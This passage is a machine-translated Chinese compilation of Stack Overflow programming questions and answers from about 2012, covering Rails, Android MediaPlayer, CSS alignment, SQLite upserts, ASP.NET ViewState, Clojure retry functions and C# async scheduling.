                                                                                                                            :aspect_mode => "crop",
                                                                                                                            :number => 10,
                                                                                                                            :filename => "{{number}}_{{width}}x{{height}}-thumbnail"}}]
                                              }) 

        zencoder_response.body["outputs"].each do |output|
      if output["label"] == "web"
        @model.zencoder_output_id = output["id"]
        @model.processed = false
        @model.save(:validate => false)
      end
    end
  end
end 
```

顺便说一句，我不知道这是否与我从 Heroku 迁移到 AWS Ec2 有关？请帮忙。

编辑：

每当我尝试设置这条线

```
:notifications => [zencoder_callback_url(:protocol => "http", :host => ENV['URL'], :port => ENV['PORT'])], 
```

进入

```
:notifications => [zencoder_callback_url(:protocol => "http", :host => 'peekbox.tv', :port => ENV['PORT'])], 
```

它有不同的错误 w/c 是

```
 NoMethodError (undefined method `each' for nil:NilClass):
      app/uploaders/media_uploader.rb:83:in `zencode'
      app/controllers/profile/videos_controller.rb:63:in `create' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-07T11:47:12.807

您应该在中添加以下选项`config/production.rb`：

```
config.action_mailer.default_url_options = { host: 'peekbox.tv' } 
```

# c# - 部署版本上的“非静态字段需要目标”

> ID：12068612
> 
> 赞同：1
> 
> 时间：2012-08-22T07:54:18.820
> 
> 标签：c#, connection-string

前段时间我遇到了数据库连接字符串的问题。我按照这个答案解决了它： [https](https://stackoverflow.com/a/7692708/1616222) ://stackoverflow.com/a/7692708/1616222 （谢谢）

当我调试时一切正常，但是当我部署应用程序并在它到达时安装它：

```
fi.SetValue(settings, false); 
```

它抛出异常“非静态字段需要一个目标”。

我正在使用 .NET Famework 3.5，我不允许更改它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:57:30.450

这意味着您的`settings`变量是`null`. 所以......让它不`null`。猜测一下：在生产中，配置文件中不存在连接字符串。

# ruby-on-rails - 访问 neo4j 生成的图中的节点的复杂性是多少？

> ID：12068614
> 
> 赞同：1
> 
> 时间：2012-08-22T07:54:26.257
> 
> 标签：ruby-on-rails, graph, nosql, complexity-theory, neo4j

我考虑为此目的使用`dbpedia`和使用。`neo4j`我有两件事我不明白：

1.  访问图中节点的复杂度是多少？
2.  如果我有一个巨大的`DB`诸如`dbpedia`任何节点搜索将需要`O(|E|+|V|)`？

我的意思是作为对图中节点的随机访问的访问，这些节点是否被散列以访问`O(1)`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-23T22:31:12.957

通过ID访问是O(1) 通过索引访问通常是O(log(n)) 扫描数据库是O(n)，访问节点的关系通常也是O(1)。

也就是说，您应该确保您的热数据集位于 mmio 缓冲区和缓存中，请参阅：

*   [http://docs.neo4j.org/chunked/snapshot/embedded-configuration.html](http://docs.neo4j.org/chunked/snapshot/embedded-configuration.html)
*   [http://video.neo4j.org/4ALA/0719-hardware-sizing-with-neo4j/](http://video.neo4j.org/4ALA/0719-hardware-sizing-with-neo4j/)

# lotus-notes - 打开现有表单的操作（按钮）

> ID：12068619
> 
> 赞同：2
> 
> 时间：2012-08-22T07:54:39.440
> 
> 标签：lotus-notes

我创建了一个显示一些信息的视图。

此外，在视图顶部，我创建了一个包含 2actions 的操作栏：新条目和删除条目。还有一个名为“formmain”的表单，其中我有一些字段和列表框，我在其中插入将出现在视图上的信息。

我想做什么并寻求您的帮助：我希望当我单击操作按钮“新条目”时，将打开/显示名为“formmain”的表单。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T08:08:25.483

您可以为此使用@Compose 公式命令。这是您的特定表单的示例：

```
@Command([Compose]; ""; "formmain") 
```

我建议您查看 Lotus Domino Designer 帮助数据库，它是您的 Notes 安装的一部分。它有很多有用的信息，包括代码示例。

# node.js - GitHub Markdown NodeJS (`ghm`)

> ID：12068620
> 
> 赞同：0
> 
> 时间：2012-08-22T07:54:48.757
> 
> 标签：node.js, github

我正在使用[https://github.com/thomblake/github-flavored-markdown](https://github.com/thomblake/github-flavored-markdown)。有效，但是当我分隔代码时：

```
```javascript
some code here ...
``` 
```

没有语法高亮，我需要包含一些东西吗？像 CSS 什么的？我当然可以使用另一个库，但这会破坏该````javascript`部分的目的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T02:57:33.503

看起来`pygments.css`分发中的文件`shared/css/`对于显示语法突出显示是必需的。假设您将结果提供给浏览器，您可能应该将所有内容都`shared`作为静态文件提供。

# android - 使用媒体播放器时出现异常

> ID：12068622
> 
> 赞同：0
> 
> 时间：2012-08-22T07:54:55.460
> 
> 标签：android

我正在使用媒体播放器播放 mp3 文件。但是当我运行它时，我得到空指针异常。请告诉我是什么问题。

这是代码：

```
package com.example.soundplayer;

import android.app.Activity;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {

    /**
     * Variables
     */
    MediaPlayer mp = null;
    String hello = "Hello!";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        /**
         * Talking with the buttonHello
         */
        final Button buttonHello = (Button) findViewById(R.id.idHello);
        buttonHello.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                managerOfSound(hello);
            } // END onClick()
        }); // END buttonHello
    } // END onCreate()

    /**
     * Manager of Sounds
     */
    protected void managerOfSound(String theText) {
        if (mp != null) {
            mp.reset();
            mp.release();
        }
        if (theText == hello){
            mp = new MediaPlayer();
            mp = MediaPlayer.create(MainActivity.this, R.raw.sound);
            mp.start();}
    }
} 
```

这是一个例外：

```
08-22 13:13:01.001: W/dalvikvm(785): threadid=3: thread exiting with uncaught exception (group=0x4001b188)
08-22 13:13:01.001: E/AndroidRuntime(785): Uncaught handler: thread main exiting due to uncaught exception
08-22 13:13:01.020: E/AndroidRuntime(785): java.lang.NullPointerException
08-22 13:13:01.020: E/AndroidRuntime(785):  at com.example.soundplayer.MainActivity.managerOfSound(MainActivity.java:57)
08-22 13:13:01.020: E/AndroidRuntime(785):  at com.example.soundplayer.MainActivity$1.onClick(MainActivity.java:30)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.view.View.performClick(View.java:2364)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.view.View.onTouchEvent(View.java:4179)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.widget.TextView.onTouchEvent(TextView.java:6541)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.view.View.dispatchTouchEvent(View.java:3709)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.view.ViewGroup.dispatchTouchEvent(ViewGroup.java:884)
08-22 13:13:01.020: E/AndroidRuntime(785):  at com.android.internal.policy.impl.PhoneWindow$DecorView.superDispatchTouchEvent(PhoneWindow.java:1659)
08-22 13:13:01.020: E/AndroidRuntime(785):  at com.android.internal.policy.impl.PhoneWindow.superDispatchTouchEvent(PhoneWindow.java:1107)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.app.Activity.dispatchTouchEvent(Activity.java:2061)
08-22 13:13:01.020: E/AndroidRuntime(785):  at com.android.internal.policy.impl.PhoneWindow$DecorView.dispatchTouchEvent(PhoneWindow.java:1643)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.view.ViewRoot.handleMessage(ViewRoot.java:1691)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.os.Handler.dispatchMessage(Handler.java:99)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.os.Looper.loop(Looper.java:123)
08-22 13:13:01.020: E/AndroidRuntime(785):  at android.app.ActivityThread.main(ActivityThread.java:4363)
08-22 13:13:01.020: E/AndroidRuntime(785):  at java.lang.reflect.Method.invokeNative(Native Method)
08-22 13:13:01.020: E/AndroidRuntime(785):  at java.lang.reflect.Method.invoke(Method.java:521)
08-22 13:13:01.020: E/AndroidRuntime(785):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:860)
08-22 13:13:01.020: E/AndroidRuntime(785):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:618)
08-22 13:13:01.020: E/AndroidRuntime(785):  at dalvik.system.NativeStart.main(Native Method) 
```

我在这一行遇到异常：

```
 mp.start(); 
```

提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:04:28.883

您必须从 create 方法获取结果并在使用该 mediaPlayer 之前检查该结果，因为如果创建成功，create 函数将返回媒体播放器对象，如果创建媒体播放器失败，则返回 NULL。

[检查官方网站中该功能的描述](http://developer.android.com/reference/android/media/MediaPlayer.html#create%28android.content.Context,%20int%29)

**`a MediaPlayer object, or null if creation failed`**

还有一件事你不需要调用 prepare() 函数，因为 `On successfully created MediaPlayer , prepare() will already have been called and must not be called again.`

您可以在调用 mp.start 之前检查 mp 是否为空

```
if(mp!=null)
  mp.start(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:58:11.277

根据 MediaPlayer 状态图，必须先`mp.prepare()`调用`mp.start()`.

![在此处输入图像描述](../Images/81ee0afd4e27e045731c392aa04f9d10.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T07:59:51.150

尝试;

```
mp = MediaPlayer.create(MainActivity.this, R.raw.sound);
if(mp!=null) {
   mp.start();
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T08:02:42.753

这可能不是问题，但你应该改变它：

```
if (theText.equals(" hello"){
     mp = MediaPlayer.create(MainActivity.this, R.raw.sound);
    mp.prepare();
    mp.start();} 
```

# php - jquery formto 向导插件 - 动态添加步骤到表单

> ID：12068624
> 
> 赞同：2
> 
> 时间：2012-08-22T07:55:03.530
> 
> 标签：php, jquery-plugins, dynamic, jquery-form-wizard

我有一个简单的网络表单，允许用户提出请求票。现在，当且仅当从第一个表单的下拉框中选择某个值时，需要显示另一个表单。否则，用户只需填写一张表格。

所以我想也许我可以使用 jquery FormToWizard 插件。但是，当从下拉列表中选择一个值时，我无法在表单中动态添加步骤。

有没有人这样做过？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-30T01:18:06.817

您不一定需要为此使用 FormToWizard 插件，特别是如果您只想添加几个步骤而不是另一个完整的表单页面。首先，我会看一下[动态选择菜单](http://railscasts.com/episodes/88-dynamic-select-menus-revised)上的 Ryan Bates Railscast 。这是我使用的技术，效果很好。

这是我的表格。仅当从会议类型选择菜单中选择“亲自”时才添加位置输入

```
<div class="row">
  <div class="span6 offset3">
    <h1>Post a Meeting</h1>
    <%= simple_form_for @meeting do |f| %>
    <%= render 'shared/error_messages', object: f.object %>

    <%= f.input :meettype, :collection => ["In Person", "Skype", "Phone"], label: "Meeting Format" %>

    <div class="field">
    <%= f.label "Meeting Location" %>
    <%= f.text_field :location, placeholder: "Location Address" %>
    </div>

    <center><%= f.submit "Post Meeting", class: "btn btn-large btn-primary" %></center>
  </div>
</div> 
```

这是我的 meeting.js.coffee 文件，它检查 meettype 选择输入的值，并根据所选的 meettype 显示或隐藏位置输入字段。

```
jQuery ->
  location = $('#meeting_location').html()
  mt = $('#meeting_meettype :selected').text()
  if mt != "In Person"
    $('#meeting_location').parent().hide()
  else
    $('#meeting_location').parent().show()
  $('#meeting_meettype').change ->
    meettype = $('#meeting_meettype :selected').text()
    if meettype =="In Person"
      $('#meeting_location').html()
      $('#meeting_location').parent().show()
    else
      $('#meeting_location').empty()
      $('#meeting_location').parent().hide() 
```

使用 FormtoWizard 插件，您可以将以下代码行添加到您的 FormtoWizard.js 文件中。添加的行当前查看集合输入字段，在这种情况下，它位于标记为用户的表单上，输入字段名称是选项。如果选择了“Foo”，则会出现“Next”按钮，用户可以继续到下一页，否则会显示提交按钮，他们可以提交表单。

```
steps.each(function(i) {
        $(this).wrap("<div id='step" + i + "'></div>");
        $(this).append("<p id='step" + i + "commands'></p>");
        var name = $(this).find("legend").html();

        //Add a selection variable to keep track of whatever input you want
        var select = $('#user_option :selected').text();

        $("#step" + 1).hide();
        $("#steps").append("<li id='stepDesc" + i + "'>Step " + (i + 1) + "<span>" + name + "</span></li>");

        //If you are on the second part of the form hide the "Next" button and show "Submit"
        if (i>0){
            $("#" + stepName + "Next").parent.hide();
            $(submmitButtonName).show();
        }

        //When the user selects a certain value the "Next" button will appear to direct them to the next form.
        $("#user_option").on("change", function(e) {
            select = $('#user_option :selected').text();
            if (select == "Foo") {
                createNextButton(i);
                selectStep(i);
            }
            else {
                $(submmitButtonName).show();
            }
        });

    }); 
```

# iphone - 弹出窗口内的滚动视图不在iPhone中滚动顶部

> ID：12068626
> 
> 赞同：3
> 
> 时间：2012-08-22T07:55:29.953
> 
> 标签：iphone, ios, uiscrollview, uipopovercontroller

我正在使用 iPad ..

那里有一个 popover 控制器。

现在，当我打开键盘时，popover 会变小。

我已经在那个 popover 中连接了滚动视图。但不知何故，它不会达到顶峰..它卡在两者之间，但它达到了比赛规模，但所有这些都没有超过。

当我有小弹出框时如何去顶部区域？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T08:10:45.753

您可以尝试`autoresizingMask`像这样设置滚动视图：

```
scrollView.autoresizingMask=UIViewAutoresizingFlexibleHeight; 
```

# html - 将图像与 CSS 对齐

> ID：12068631
> 
> 赞同：3
> 
> 时间：2012-08-22T07:55:46.457
> 
> 标签：html, css

我有以下 HTML 输出，我无法更改。这只是两个链接，一个是文本链接，另一个是图像。

问题是图像的位置比文本高一些。我试图在图像中间对齐文本，但没有取得任何成功。

我尝试将`padding-top`,`margin-top`和设置`vertical-align`为图像，但它们似乎都不起作用。我会给予任何帮助。

HTML：

```
<p>
    <a href="#" class="link">
        <img width="14" height="14" src="http://i50.tinypic.com/f08ehe.jpg">
    </a>
    <a href="#" class="link">my title</a>
</p> 
```

CSS：

```
.link img{
   margin-top: 5px;   
} 
```

JSFiddle：http: [//jsfiddle.net/e3vnQ/](http://jsfiddle.net/e3vnQ/)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T07:59:16.763

尝试使用`display: inline-block`和`vertical-align: middle`：http: [//jsfiddle.net/e3vnQ/7/](http://jsfiddle.net/e3vnQ/7/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:59:10.823

添加`align="top"`

```
<p>
    <a href="#" class="link">
        <img width="14" height="14" src="http://i50.tinypic.com/f08ehe.jpg" align="top">
    </a>
    <a href="#" class="link">my title</a>
</p> 
```

CSS：

```
.link img{
   margin-top: 5px;   
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T08:07:48.467

你可以这样写**CSS**：-

当`anchor`标签进入时，`p`标签将保留`vertical-align:middle;`在下面提到的css中

```
p{
    font-size: 12px;
    border: 1px solid red;

}
p a {
    display:inline-block;
    vertical-align:middle;

}
.link img{
   margin-top: 5px;    
} 
```

或查看演示：- [http://jsfiddle.net/e3vnQ/13/](http://jsfiddle.net/e3vnQ/13/)

# c# - 在 SQLite 3 中使用 Linq 表达式进行更新插入

> ID：12068632
> 
> 赞同：2
> 
> 时间：2012-08-22T07:55:55.753
> 
> 标签：c#, linq, sqlite, windows-8, windows-runtime

> **可能重复：**
> [SQLite - UPSERT*不是*INSERT 或 REPLACE](https://stackoverflow.com/questions/418898/sqlite-upsert-not-insert-or-replace)
> [如何更新表中的行或如果它不存在则插入它？](https://stackoverflow.com/questions/690632/how-do-i-update-a-row-in-a-table-or-insert-it-if-it-doesnt-exist)

我正在使用 Windows 8 发布预览版和 C#(VS 2012) 开发 Metro 应用程序，我是 SQLite 新手，我在我的应用程序中集成了 SQLite 3.7.13，它运行良好，在 MYSQL 中我们喜欢

```
INSERT INTO tablename (id, name)
VALUES (21, 'foo')
ON DUPLICATE KEY UPDATE name = 'boo'; 
```

我们如何使用 Linq 表达式在 SQLite 3 中实现这一点，现在我正在插入记录并`SQLiteException`在异常时捕获和更新该记录。请注意下面的代码

```
var dbPath = Path.Combine(Windows.Storage.ApplicationData.Current.LocalFolder.Path,"Student.db");
DateTime LastUpdated = DateTime.UtcNow;
using (var db = new SQLite.SQLiteConnection(dbPath))
{   
    try
    {
        db.Insert(new studentRecord() { sid = 21, name = 'foo', last_updated = LastUpdated });                   
    }
    catch(SQLite.SQLiteException ex)
    {
        db.Update(new studentRecord() { sid = 21, name = 'boo', last_updated = LastUpdated });
    }
} 
```

`studentRecord`我的表名在哪里。我不确定这是正确的方法，有什么方法可以在单个查询中实现，请帮助我。提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-24T00:04:12.837

您提出的解决方案具有竞争条件。插入失败后，其他人可能会删除该行，因此更新也会失败。如果您没有并发编写器，这很好（尽管您可能需要在异常处理中更具选择性，以防出现其他问题）。如果你这样做……</p>

使用 SQLite`INSERT`语句的冲突子句：

```
INSERT OR REPLACE INTO … 
```

我怀疑您是否能够直接从 LINQ 访问它，因此您可能必须通过[DataContext.ExecuteQuery](http://msdn.microsoft.com/en-us/library/system.data.linq.datacontext.executequery.aspx)使用原始 SQL 。

# android - 在@Singleton 上发布 ORMLite 助手

> ID：12068634
> 
> 赞同：4
> 
> 时间：2012-08-22T07:56:04.540
> 
> 标签：android, guice, ormlite, roboguice

我有一个`@Singleton`类，我在其中注入了`OrmLiteSqliteOpenHelper`. 我真的需要打电话`OpenHelperManager.releaseHelper()`吗？如果我这样做，应该在哪里以及如何完成，因为该类没有扩展任何我可以到达的 Android 基类`onDestroy`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T14:16:25.800

有一个[ORMLite](http://ormlite.com/)示例 Android 项目演示了这一点，称为[HelloAndroidNoBase](http://ormlite.com/android/examples/)。我会检查一下。

主要的相关代码部分`Activity`包括在下面。您需要在每个`Activity`使用数据库的类或其他类中都有这种代码。

如果您的类没有`onDestroy()`方法，那么您需要添加一个并从其他具有`onDestroy()`. 主要`Activity`是这个的好地方。所以你`MainActivity.onDestroy()`会`yourClass.onDestroy()`在应用程序关闭时调用。

```
public class HelloNoBase extends Activity {

    private DatabaseHelper databaseHelper = null;

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (databaseHelper != null) {
            OpenHelperManager.releaseHelper();
            databaseHelper = null;
        }
    }

    private DatabaseHelper getHelper() {
        if (databaseHelper == null) {
            databaseHelper = OpenHelperManager.getHelper(this,
                DatabaseHelper.class);
        }
        return databaseHelper;
    }
} 
```

# c# - 更改列表 到字典 但保持兼容性

> ID：12068636
> 
> 赞同：1
> 
> 时间：2012-08-22T07:56:23.900
> 
> 标签：c#, serialization, dictionary

我们在生产中有以下代码，它被用于 JSON 序列化/反序列化（硬盘驱动器上文件中 SomeType 的序列化列表）：

```
public sealed class Cultures : List<Culture>
{
} 
```

需求已经发生了变化，如果我们像这样实现它，我们将受益匪浅，`Dictionary<string, Culture>`因为我们获得了键/值功能（`Culture`类有一个`ID`类型的属性，`string`可以用作键）。我们`List`必须手动执行此操作。

去 Cultures : Dictionary 的最佳（或唯一，如果有的话）方法是什么，但即使使用那些已经序列化了文化列表的文件，也要保持序列化工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:01:48.063

更改属性并自定义序列化以支持旧格式。如果您使用的是 json.net，请使用 [JonConverter] 属性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:45:44.890

您可以保留列表并使用*LINQ*添加转换器方法。

```
public sealed class Cultures : List<Culture>
{
  public Dictionary<string, Culture> ToDictionary()
  {
    return this.ToDictionary(_=>_.Id);
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:04:30.900

在 Cultures 类上实现接口[IDictionary 。](http://msdn.microsoft.com/en-us/library/s4ys34ea.aspx)您可以将其用作字典，但所有序列化都像以前一样工作。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-22T08:39:50.617

```
[CollectionDataContract]
public sealed class Cultures : Dictionary<string, Culture>
{
} 
```

# asp.net - 可绑定控件（GridView、Repeater）如何在回发之间维护源数据

> ID：12068639
> 
> 赞同：0
> 
> 时间：2012-08-22T07:56:25.287
> 
> 标签：asp.net, data-binding, gridview, repeater

我在我的应用程序中广泛使用*GridView*和*Repeater*（以及其他类似*DropDownList*）控件以及为*ObjectDataSource提供数据的**ObjectDataSource*组件和类（*ObjectDataSource上的**TypeName* / *SelectMethod*属性）。我最近注意到*SelectMethod*仅在

 **```
IsPostBack == false 
```

另外，当我手动绑定时，我总是在*!IsPostBack*时绑定。直到现在，我从不好奇控件如何在回发之间维护它们的数据（我必须创建带有排序/分页等的 GridView，并且我想有效地做到这一点）。

您能否解释/提供一些带有描述如何完成的链接？

我也没有得到一件事：在使用*GridView*并迭代行时，有时我需要访问其***GridViewRow.DataItem***属性以获取支持对象（通常是获取某种 ID）。有时它是空的 - 有时不是。我不知道为什么。但是，它为空，我仍然可以访问（例如）***GridViewRow.DataKeys***。

谢谢

**编辑**：知道什么时候答案说这要归功于**ViewState**，我还有一个问题：如果我数据绑定 100 个非常重的业务对象，并且在数据绑定时我只使用几个属性（假设我还使用 OnRowDataBound 事件来呈现一些额外的数据），这是否意味着整个对象都被序列化了？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:59:39.840

ASP.Net 在所有 HTML 页面中使用 ViewState 一个隐藏变量来维护页面的状态。

阅读本文以获得更多理解

[http://www.google.co.in/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&sqi=2&ved=0CFMQFjAB&url=http%3A%2F%2Fmsdn.microsoft.com%2Fen-us% 2Flibrary%2Fms972976.aspx&ei=UpE0UK3uBsOqrAe94ICwBg&usg=AFQjCNG5ErbrFH0ZYV_WW-jonIl25xEsDQ](http://www.google.co.in/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&sqi=2&ved=0CFMQFjAB&url=http%3A%2F%2Fmsdn.microsoft.com%2Fen-us%2Flibrary%2Fms972976.aspx&ei=UpE0UK3uBsOqrAe94ICwBg&usg=AFQjCNG5ErbrFH0ZYV_WW-jonIl25xEsDQ)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:58:23.867

他们将其存储在名为`ViewState`（或更准确地说是“__VIEWSTATE”）的页面上的隐藏字段中。如果您在 ASPX 页面上查看源代码，您会看到它。

您也可以通过访问 Page 的 ViewState 属性在 ViewState 中存储和检索页面的状态信息。

我将从这里开始[http://msdn.microsoft.com/en-us/library/ms972976.aspx](http://msdn.microsoft.com/en-us/library/ms972976.aspx)

所以，是的，如果你存储了大量的大对象，在页面周期中就会有大量的数据来回传输到客户端。小心使用，Viewstate 会很有用，但如果使用不慎，则会产生负面影响。**

# clojure - 在抛出异常之前重试3次 - 在clojure中

> ID：12068640
> 
> 赞同：5
> 
> 时间：2012-08-22T07:56:34.187
> 
> 标签：clojure

我不知道如何在 Clojure 中实现这段 Python 代码

```
for i in range(3):
    try:
        ......
    except e:
        if i == 2:
            raise e
        else:
            continue
    else:
        break 
```

我想知道为什么 Python 中如此简单的东西在 Clojure 中却如此困难。我认为困难在于 Clojure 是一种函数式编程语言，因此不适合这种命令式任务。这是我的尝试：

```
(first
  (remove #(instance? Exception %)
    (for [i (range 3)]
      (try (......)
              (catch Exception e
                (if (== i 2) 
                  (throw e)
                  e))))))) 
```

它非常难看，更糟糕的是，它没有按预期工作。for 循环实际上是完全评估而不是延迟评估（当我在里面放一个 println 时我意识到了这一点）。

如果有人有更好的想法来实现它，请赐教。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-22T08:15:11.277

类似于 Marcyk 的答案，但没有宏诡计：

```
(defn retry
  [retries f & args]
  (let [res (try {:value (apply f args)}
                 (catch Exception e
                   (if (zero? retries)
                     (throw e)
                     {:exception e})))]
    (if (:exception res)
      (recur (dec retries) f args)
      (:value res)))) 
```

有点复杂，因为您不能`recur`在`catch`子句中。请注意，这需要一个函数：

```
(retry 3 (fn [] 
          (println "foo") 
          (if (zero? (rand-int 2))
              (throw (Exception. "foo"))
              2)))
=>
foo ;; one or two or three of these
foo
2 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-22T08:09:55.410

这是一种方法：

```
(defmacro retry
  "Evaluates expr up to cnt + 1 times, retrying if an exception
  is thrown. If an exception is thrown on the final attempt, it
  is allowed to bubble up."
  [cnt expr]
  (letfn [(go [cnt]
            (if (zero? cnt)
              expr
              `(try ~expr
                    (catch Exception e#
                      (retry ~(dec cnt) ~expr)))))]
    (go cnt))) 
```

来自 REPL 的示例：

```
user> (retry 2 (do (println :foo) (throw (RuntimeException. "foo"))))
:foo
:foo
:foo
; Evaluation aborted. 
```

（如果第一次失败，则传递`2`to`retry`要求重试两次，总共尝试三次。打印三个 s，因为在传递给的表单中发生之前。最后意味着抛出异常。）`expr``:foo``println``throw``do``retry``; Evaluation aborted.`

另外，关于`for`您的代码段中的循环：

如果您尝试在更长的范围内循环（例如替换`(range 3)`为`(range 10)`），则输出将在`i`到达之后结束`3`。此外，如果您在`println`引发异常的表单之前输入 a，它当然会打印出您传递给它的任何内容；如果`println`发生在异常抛出表单之后，则不会打印输出。在任何情况下，最多`println`将执行三个调用（假设每次迭代都会引发异常）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-26T19:55:01.103

```
(cond (every? nil? (for [x (range (inc retry)) :while (not @tmp-doc)]
 ...do sth) )                  
;all failed
:else
;at least one success 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-06-17T11:00:02.833

根据这个问题的答案重试睡眠和另一个实现：

```
(defn retry [retries sleep-ms func url options]
  (let [{:keys [status headers body error] :as resp} @(func url options)]
    (if error
      (do
        (log/error (str "Retry " retries " returned error: " e))
        (Thread/sleep sleep-ms)
        (if (= retries 1)
          resp
          (retry (dec retries) sleep-ms func url options)))
      resp))) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-03-07T13:48:54.220

你可以这样做：

```
(defn retry
  "Tries at most n times, return first try satisfying pred or nil"
  [times pred? lazy-seq]
  (let [successful-trial (drop-while (complement pred?) (take times lazy-seq))]
    (if (empty? successful-trial)
        nil
        (first successful-trial)))) 
```

然后你可以这样使用这个函数：

```
(when-not (retry 3 pos? (repeatedly #(rand-nth [-1 -2 -3 2 1]))
    (throw (Exception. "my exception message")) 
```

这将尝试最多三次从向量中随机取一个正数，如果不成功，则抛出异常。

# c#-4.0 - 如何使用 async-await 创建一个从不一次执行多个任务的调度程序？

> ID：12068645
> 
> 赞同：19
> 
> 时间：2012-08-22T07:56:40.250
> 
> 标签：c#-4.0, async-await

我想实现一个类或模式，以确保对于一组特定的操作（HTTP 调用）一次不会执行多个任务。任务的调用可以随机来自不同的线程。我想利用异步等待模式，以便调用者可以通过将调用包装在 try-catch 中来处理异常。

这是预期执行流程的图示：

![在此处输入图像描述](../Images/cdb883c06c0acfceb4b7a7723afb9dea.png)

来自调用者的伪代码：

```
try {
    Task someTask = GetTask();
    await SomeScheduler.ThrottledRun(someTask);
} 
catch(Exception ex) { 
    // Handle exception
} 
```

这里的`Task`类可能是一个`Action`取决于解决方案的类。

请注意，当我在这个问题中使用“Schedule”这个词时，我不一定会使用与[.NET Task Scheduler](http://msdn.microsoft.com/en-us/library/dd997402.aspx)相关的词。我不太了解 async-await 库，无法知道以什么角度以及使用什么工具来解决这个问题。TaskScheduler 在这里可能是相关的，也可能不是。我已经阅读了[TAP 模式](http://www.microsoft.com/en-us/download/confirmation.aspx?id=19957)文档，发现几乎可以解决这个问题的模式，但并不完全（关于交错的章节）。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-08-22T08:50:39.040

.NET 4.5 中有一种新[`ConcurrentExclusiveSchedulerPair`](http://msdn.microsoft.com/en-us/library/system.threading.tasks.concurrentexclusiveschedulerpair%28v=VS.110%29.aspx)类型（我不记得它是否包含在 Async CTP 中），您可以使用它`ExclusiveScheduler`来限制一次执行一个`Task`。

考虑将您的问题构建为[Dataflow](http://msdn.microsoft.com/en-us/devlabs/gg585582.aspx)。很容易将 a 传递给`TaskScheduler`您想要限制的数据流部分的块选项。

如果您不想（或不能）使用 Dataflow，您可以自己做类似的事情。请记住，在 TAP 中，您总是返回已启动的任务，因此您不会像在 TPL 中那样将“创建”与“调度”分开。

您可以像这样`ConcurrentExclusiveSchedulerPair`安排`Action`s（或`async`没有返回值的 lambda）：

```
public static ConcurrentExclusiveSchedulerPair schedulerPair =
    new ConcurrentExclusiveSchedulerPair();
public static TaskFactory exclusiveTaskFactory =
    new TaskFactory(schedulerPair.ExclusiveScheduler);
...
public static Task RunExclusively(Action action)
{
  return exclusiveTaskFactory.StartNew(action);
}
public static Task RunExclusively(Func<Task> action)
{
  return exclusiveTaskFactory.StartNew(action).Unwrap();
} 
```

对此有几点需要注意：

*   `ConcurrentExclusiveSchedulerPair`只有坐标s的单个实例`Task`排队到其调度程序。第二个实例`ConcurrentExclusiveSchedulerPair`将独立于第一个实例，因此您必须确保在要协调的系统的所有部分中使用相同的实例。
*   一个`async`方法将 - 默认情况下 - 在`TaskScheduler`启动它的相同处恢复。所以这意味着如果一个`async`方法调用另一个`async`方法，“子”方法将“继承”父方法的`TaskScheduler`. 任何`async`方法都可以选择不继续`TaskScheduler`使用`ConfigureAwait(false)`（在这种情况下，它直接在线程池上继续）。

# c# - 创建一个不是创建进程子进程的新进程

> ID：12068647
> 
> 赞同：2
> 
> 时间：2012-08-22T07:56:50.917
> 
> 标签：c#, windows, createprocess

